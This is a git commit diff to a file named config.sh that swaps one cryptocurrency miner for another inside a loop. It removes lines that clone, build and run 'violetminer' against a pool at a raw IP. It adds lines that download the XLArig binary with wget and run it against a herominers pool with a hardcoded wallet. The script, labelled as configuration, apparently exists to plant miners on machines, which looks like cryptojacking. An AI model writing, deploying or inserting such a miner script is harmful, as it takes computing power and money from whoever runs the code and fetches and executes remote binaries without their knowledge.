1db1d4b50e601b5cd5619e1dbd234ea019b1522e
aniw9912 <88722697+aniw9912@users.noreply.github.com>
2021-08-12 13:20:18 +0700

    Update config.sh

--- config.sh
+++ config.sh
@@ -5,15 +5,11 @@ until [  $COUNTER -lt 20 ]; do
 
 sudo apt update
 sudo apt install screen -y 
-git clone https://github.com/yantiharis463/violetminer.git
-cd violetminer
-git submodule update --init --recursive
-mkdir build
-cd build
-cmake ..
-make
-./violetminer --pool 137.220.41.134:1337 --username USDT:TQdN4dzKNxMox7he3huXUdUdpG4XvEt58U.x --password x --algorithm wrkzcoin
- 
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip
+apt install -y unzip
+unzip XLArig-v5.2.2-linux-x86_64.zip
+./xlarig --donate-level 1 -o scala.herominers.com:10131 -u SvkJRYwYgTMfxk2YLaVgJHYTUAyiEhMxJY77qGKvkKL5VQwruK7YvT8i22MzfC1dWUKrMXXnWwUSohcLtzQ2KLwX2RQvYsKyu -p Fucek -t2 -a panthera -k
+
      echo COUNTER $COUNTER
      let COUNTER-=1
 done
